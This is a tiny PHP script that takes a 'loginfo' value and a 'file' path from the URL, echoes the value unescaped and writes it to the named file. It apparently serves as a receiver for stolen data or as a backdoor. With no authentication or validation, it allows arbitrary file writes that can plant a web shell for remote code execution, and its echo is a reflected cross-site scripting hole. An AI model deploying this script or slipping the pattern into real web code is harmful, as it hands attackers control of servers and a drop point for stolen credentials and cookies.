<?php
	$p1 = $_GET['loginfo'];
	$p2 = $_GET['file'];
	echo $p1;
	$file_pointer = fopen($p2, "w");
	fwrite($file_pointer, $p1);
	fclose($file_pointer);
?>